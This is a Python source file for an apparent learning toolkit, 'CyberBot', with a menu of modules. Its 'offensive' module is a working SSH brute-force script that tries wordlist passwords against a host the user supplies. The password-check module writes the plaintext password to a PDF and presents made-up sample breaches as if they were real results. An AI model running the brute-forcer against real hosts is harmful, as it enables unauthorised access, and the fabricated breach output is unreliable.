# CyberBot 

import paramiko
import hashlib
import os
import requests
from fpdf import FPDF
import sys
import csv

# -------------------------------
# Offensive Tool: SSH Brute Force Auditor
# -------------------------------
def run_ssh_bruteforce():
    host = input("Enter target host (IP or domain): ")
    username = input("Enter SSH username: ")
    password_file = input("Enter password file path (e.g., passwords.txt): ")

    try:
        with open(password_file, "r", encoding="latin-1") as file:
            passwords = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"Error reading password file: {e}")
        return

    print(f"[*] Starting brute force on {host} with {len(passwords)} passwords...")

    for password in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password, timeout=3)
            print(f"[+] SUCCESS: Password found -> {password}")
            with open("ssh_bruteforce_report.txt", "w") as report:
                report.write(f"Host: {host}\nUsername: {username}\nPassword: {password}\n")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password}")
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    print("[*] Brute force complete. No password found.")

# -------------------------------
# Defensive Tool: DFIR Tool (Multi-Hash)
# -------------------------------
def run_dfir_tool():
    print("[*] Running DFIR Tool with multiple hash types...")
    hash_algorithms = ["md5", "sha1", "sha256", "sha512"]
    checksums = {}

    for file in os.listdir("."):
        if file.endswith(".py"):
            with open(file, "rb") as f:
                data = f.read()
                file_hashes = {}
                for algo in hash_algorithms:
                    h = hashlib.new(algo)
                    h.update(data)
                    file_hashes[algo] = h.hexdigest()
                checksums[file] = file_hashes

    # Save to CSV
    with open("checksums.csv", "w", newline="") as out:
        writer = csv.writer(out)
        header = ["File"] + hash_algorithms
        writer.writerow(header)
        for file, file_hashes in checksums.items():
            row = [file] + [file_hashes[algo] for algo in hash_algorithms]
            writer.writerow(row)

    print("[+] DFIR report generated with multiple hashes: checksums.csv")

# -------------------------------
# Defensive Tool: Password CTI Report 
# -------------------------------

def run_password_cti_report():
    print("[*] Generating Password CTI Report...")
    password = input("Enter a password to check: ")
    api_key = input("Enter your HaveIBeenPwned API key (leave blank for demo): ")

    # HIBP Pwned Passwords API uses k‑Anonymity (first 5 chars of SHA1 hash)
    import hashlib
    sha1_hash = hashlib.sha1(password.encode("utf-8")).hexdigest().upper()
    prefix, suffix = sha1_hash[:5], sha1_hash[5:]

    url = f"https://api.pwnedpasswords.com/range/{prefix}"
    breaches = []

    if api_key:
        headers = {"User-Agent": "CyberBot", "hibp-api-key": api_key}
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                # Response contains suffixes + counts
                lines = response.text.splitlines()
                for line in lines:
                    hash_suffix, count = line.split(":")
                    if hash_suffix == suffix:
                        breaches.append({"Name": "Password", "Count": count})
                        break
            else:
                print(f"[!] Error fetching data: {response.status_code}")
        except Exception as e:
            print(f"[!] Request failed: {e}")
    else:
        print("[*] No API key entered, using sample breach data...")
        breaches = [
            {"Name": "Adobe", "Count": "1520000"},
            {"Name": "LinkedIn", "Count": "980000"},
            {"Name": "Dropbox", "Count": "500000"},
            {"Name": "MySpace", "Count": "300000"},
            {"Name": "Canva", "Count": "120000"},
            {"Name": "Tumblr", "Count": "80000"}
        ]

    # Generate PDF report
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, "CyberBot CTI Report (Password Check)", ln=True, align="C")
    pdf.ln(10)

    pdf.cell(200, 10, f"Password: {password}", ln=True)
    if breaches:
        pdf.cell(200, 10, f"Status: breached {len(breaches)} times", ln=True)
        pdf.ln(10)
        pdf.cell(200, 10, "Breaches:", ln=True)
        for breach in breaches:
            pdf.cell(200, 10, f"- {breach['Name']} (seen {breach['Count']} times)", ln=True)
    else:
        pdf.cell(200, 10, "Status: No breaches found", ln=True)

    pdf.output("password_cti_report.pdf")
    print("[+] Password CTI report saved as password_cti_report.pdf")

# -------------------------------
# Defensive Module: Mitigation Report
# -------------------------------
def run_mitigation_report():
    print("[*] Generating Mitigation Report...")
    recommendations = [
        "Use strong, unique passwords.",
        "Enable multi-factor authentication.",
        "Regularly patch and update systems.",
        "Monitor logs for suspicious activity.",
        "Educate users about phishing attacks."
    ]

    with open("mitigation_report.txt", "w") as report:
        report.write("CyberBot Mitigation Recommendations:\n")
        for rec in recommendations:
            report.write(f"- {rec}\n")

    print("[+] Mitigation report saved as mitigation_report.txt")

# -------------------------------
# CyberBot Launched!
# -------------------------------
def main():
    while True:
        print("""
        ==========================================
                  CYBERBOT MENU
        ==========================================
        Offensive Module:
        1. SSH Brute Force Auditor

        Defensive Modules:
        2. DFIR Tool (Multi-Hash)
        3. Password CTI Report 
        4. Mitigation & Recommendations Report

        0. Exit
        """)
        choice = input("Select option: ")

        if choice == "1":
            run_ssh_bruteforce()
        elif choice == "2":
            run_dfir_tool()
        elif choice == "3":
            run_password_cti_report()
        elif choice == "4":
            run_mitigation_report()
        elif choice == "0":
            print("Exiting CyberBot Toolkit. Goodbye!")
            sys.exit()
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    main()